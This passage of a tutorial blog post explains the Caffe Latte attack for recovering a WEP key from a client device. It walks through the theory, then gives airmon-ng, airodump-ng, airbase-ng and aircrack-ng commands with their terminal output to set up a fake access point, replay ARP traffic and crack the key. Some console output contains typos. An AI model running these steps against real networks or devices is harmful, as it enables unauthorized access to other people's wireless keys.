src=\"/images/attackcoffelatte.png?raw=true\" alt=\"Alt text\" title=\"Coffe\"></p>\n<h1 id=\"Theoretical-Process\"><a href=\"#Theoretical-Process\" class=\"headerlink\" title=\"Theoretical Process\"></a>Theoretical Process</h1><p>1.- The attacker creates a Wifi access point (AP) with an ESSID exactly the same as one that is stored in a victim computer, this network will have Wep security but with a different key to the client because we do not know it.</p>\n<p><img src=\"/images/caffelate1screenshot.png?raw=true\" alt=\"Alt text\" title=\"CoffeLate1screenshot\"></p>\n<p>2.- Although the attacker and the victim have different encryption keys, the wep encryption allows to reach the phase of association of the client to the access point.</p>\n<p><img src=\"/images/caffelate2screenshot.png?raw=true\" alt=\"Alt text\" title=\"CoffeLate1screenshot\"></p>\n<p>3.- The authentication process of the client is done through the proposal of a “challenge”, this is done from attacker to client, the “challenge” is nothing more than a cipher text with the shared key, the client will answer the challenge and the fake access point will say that it is valid although it is not true, then it will send an “Authentication Success”.</p>\n<p>4.- Once the authentication process is finished, the client is associated to the access point.</p>\n<p>5.-Once the association is established, the client will try to obtain an ip via DHCP but the fake access point will not have DHCP and after a timeout the client OS will automatically assign a static ip corresponding to the APIPA range (169.254.0.1 to 169.254.255.255.254 with mask 255.255.0.0).</p>\n<p><img src=\"/images/caffelate3screenshot.png?raw=true\" alt=\"Alt text\" title=\"CoffeLate1screenshot\"></p>\n<p>6.- The client will send free ARPS informing of the static ip that has been self-assigned to avoid problems in the network.</p>\n<h1 id=\"Obtaining-the-password\"><a href=\"#Obtaining-the-password\" class=\"headerlink\" title=\"Obtaining the password :)))\"></a>Obtaining the password :)))</h1><p>7.- Finally, from the free ARP the AP Fake will introduce in the network ARP requests from any ip with destination ip to the client ip, the client will respond to the ARP packets that are arriving and in a short time we will have enough traffic to crack the WEP password.</p>\n<p><img src=\"/images/caffelate4screenshot.png?raw=true\" alt=\"Alt text\" title=\"CoffeLate1screenshot\"></p>\n<h1 id=\"Small-explanations\"><a href=\"#Small-explanations\" class=\"headerlink\" title=\"Small explanations\"></a>Small explanations</h1><p>Simple, right, well, I want to tell you a few things before going to practice, the first thing is to tell you that, although this method seems very easy to perform, currently it is no longer, this protocol has been discontinued causing this attack is no longer viable, even so you can make a test environment to test this, I assure you that it is quite fun to perform</p>\n<p>The second thing is that, to perform all these wireless network attacks, you will need to have a network card that MUST have monitor mode, be sure to check if they have this mode before buying one, and preferably a good antenna to pick up signal, traffic. Something like this:</p>\n<p><img src=\"/images/network-card.jpg?raw=true\" alt=\"Alt text\" title=\"Network-Card\"></p>\n<p>I would recommend you to buy the one you like the most</p>\n<p>This is the one I have and the one I recommend the most :) :</p>\n<hr>\n<table>\n<thead>\n<tr>\n<th><a href=\"https://www.amazon.com/-/es/Adaptador-Link-Wireless-Negro-Blanco/dp/B002SZEOLG\">https://www.amazon.com/-/es/Adaptador-Link-Wireless-Negro-Blanco/dp/B002SZEOLG</a></th>\n</tr>\n</thead>\n</table>\n<h1 id=\"Practice\"><a href=\"#Practice\" class=\"headerlink\" title=\"Practice\"></a>Practice</h1><h2 id=\"Network-Interface\"><a href=\"#Network-Interface\" class=\"headerlink\" title=\"Network Interface\"></a>Network Interface</h2><p>First we will have to see our network interfaces, for it we write ifconfig in our console and several options will appear to us, we choose the one that has the option for monitor mode, in my case it appears as wlan1.</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">ifconfig</span></span><br><span class=\"line\"></span><br><span class=\"line\">docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class=\"line\">        ether 02:42:3c:5a:be:41  txqueuelen 0  (Ethernet)</span><br><span class=\"line\">        RX packets 0  bytes 0 (0.0 B)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 0  bytes 0 (0.0 B)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 192.168.126.136  netmask 255.255.255.0  broadcast 192.168.126.255</span><br><span class=\"line\">        inet6 fe80::ad27:5aab:c811:2dbd  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class=\"line\">        ether 00:0c:29:b3:0d:18  txqueuelen 1000  (Ethernet)</span><br><span class=\"line\">        RX packets 260062  bytes 288327227 (274.9 MiB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 134684  bytes 24893626 (23.7 MiB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class=\"line\">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class=\"line\">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class=\"line\">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class=\"line\">        RX packets 4679  bytes 23032556 (21.9 MiB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 4679  bytes 23032556 (21.9 MiB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">wlan1: **************************** *********</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n<p>Once we start the card in monitor mode and we can see it in the network interface with ifconfig (seen in the previous step), we will type this command:<br>airmon-ng start wlan1</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">airmon-ng start wlan1</span></span><br><span class=\"line\">Found 3 processes that could cause t rouble.</span><br><span class=\"line\">If airodump-ng, aireplay-ng or airtun-ng stops working after</span><br><span class=\"line\">a short period of time, you may want to kill (some of) them!</span><br><span class=\"line\">-e</span><br><span class=\"line\">PID     Name</span><br><span class=\"line\">2731    NetworkManager</span><br><span class=\"line\">2906    wpa_supplicant</span><br><span class=\"line\">3078     dhclient</span><br><span class=\"line\">Process with PID 3078 (dhclient) is running on interface wlano</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Interface               Chipset                      Driver</span><br><span class=\"line\"></span><br><span class=\"line\">wlane                   Intel 6230                   iwlwifi - [phy0]</span><br><span class=\"line\">wlan1                   Realtek RTL8187L             rt19197 - [phy1]</span><br><span class=\"line\">                                  monitor mode enabled on mono0)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Monitoring-the-traffic\"><a href=\"#Monitoring-the-traffic\" class=\"headerlink\" title=\"Monitoring the traffic\"></a>Monitoring the traffic</h2><p>With the command airodump-ng we will start to listen and collect all the traffic that circulates through the air, we will see how initially there is no wifi network called “caffelatte” and after executing&gt;.</p>\n<p>The -c 7 option is to filter the searches to channel 7, the -w “namefile” option is to save the capture in the “namefile” file.</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">airodump-ng -c 7 -w caffelattecapture mon0</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Dummy-access-point\"><a href=\"#Dummy-access-point\" class=\"headerlink\" title=\"Dummy access point\"></a>Dummy access point</h2><p>We create the fake AP to perform the attack with the airbase-ng program we will create the fake access point.</p>\n<p>Options:<br>The -c 7 option will create the access point on channel 7.<br>Option -a XX:XX:XX:XX:XX:XX:XX:XX:XX is used to create the access point with this mac address<br>The -e “XX” option is used to give the name (ESSID) “XX” to the network.<br>The -L option is used to make airbase-ng adopt the caffelatte attack configuration.<br>The -W 1 option is used for the network to adopt WEP encryption, if there is a 0 the network will be open.<br>The -x “XX” option is optional, it is used to send “XX” packets per second once the attack starts.</p>\n<p>airbase-ng -c 7 -a XX:XX:XX:XX:XX:XX:XX:XX -e “caffelatte” -L -W 1 -x 100 mon0</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">airbase-ng -с 7 -а 58:6D:8F:AE:BF:F0 -е <span class=\"string\">&quot;CaffeLatte&quot;</span> -L -W - X 100 mono</span></span><br><span class=\"line\">12:25:25  Created tap interface ato</span><br><span class=\"line\">12:25:25  Trying to set MTU on ato to 1500</span><br><span class=\"line\">12:25:25  Access Point with BSSID 58:6d:8F:AE:BF:F0 started.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Start-the-Attack\"><a href=\"#Start-the-Attack\" class=\"headerlink\" title=\"Start the Attack :)))\"></a>Start the Attack :)))</h2><p>When the client connects to the network it will associate to it and start the attack, the status of the attack will be shown in the airbase-ng terminal.</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:28:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:28:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:16   Starting Caffe-Latte attack against 64:70:02:28:4E:2F at 100 pps.</span><br></pre></td></tr></table></figure>\n\n<p>We will see in airodump-ng that the client has connected and starts transmitting frames.</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CH 7 1[ Elapsed: 36 S 1[ 2013-09-05 12:21</span><br><span class=\"line\">BSSID                PWR RXQ Beacons   #Data, #/s CH MB   ENC CIPHER AUTH ESSID</span><br><span class=\"line\">58:6D:8F:AE:BF:F0    O   O   741       61     1   7  54   WEP WEP         CaffeLatte</span><br><span class=\"line\"></span><br><span class=\"line\">BSSID                STATION            PWR   Rate    Lost    Frames  Probe</span><br><span class=\"line\">58:6D:8F:AE:BF:F0    64:0B:3A:1C:**:**  -40   0 - 1      0      1836</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Decrypting-the-key\"><a href=\"#Decrypting-the-key\" class=\"headerlink\" title=\"Decrypting the key\"></a>Decrypting the key</h2><p>When we have captured a high number of initialization vector packets (IV) we will proceed to run aircrack-ng to obtain the key</p>\n<p>with the option -e “xx” we will decrypt only the network with the name (ESSID) “xx”.</p>\n<p>aircrack-ng -e caffelatte caffelattecapture*.cap</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">aircrack-ng -e caffelatte caffelattecapture*.<span class=\"built_in\">cap</span></span></span><br></pre></td></tr></table></figure>"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}